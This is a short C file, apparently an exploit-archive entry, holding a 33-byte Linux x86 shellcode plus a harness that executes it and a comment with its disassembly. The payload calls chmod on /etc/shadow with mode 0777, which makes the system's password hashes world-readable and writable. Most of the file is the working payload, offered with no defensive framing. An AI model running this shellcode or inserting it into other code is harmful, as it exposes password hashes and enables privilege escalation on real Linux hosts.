/*
# 5m0k3.digital.3scape@gmail.com
# http://plasticsouptaste.blogspot.com
# Name: 33 bytes chmod("/etc/shadow", 0777) shellcode
# Platform: Linux x86
*/

#include "stdio.h"

int main(int argc, char *argv[])
{

char shellcode[]
="\x31\xc0\x50\xb0\x0f\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x89\xe3\x31\xc9\x66\xb9\xff\x01\xcd\x80\x40\xcd\x80";

printf("Length: %d\n",strlen(shellcode));
(*(void(*)()) shellcode)();

return 0;
}

/*
xor %eax,%eax
push %eax
mov $0xf,%al
push $0x776f6461
push $0x68732f63
push $0x74652f2f
mov %esp,%ebx
xor %ecx,%ecx
mov $0x1ff,%cx
int $0x80
inc %eax
int $0x80

*/
--
Blog transitioéthanolique contemporain :
http://plasticsouptaste.blogspot.com/!!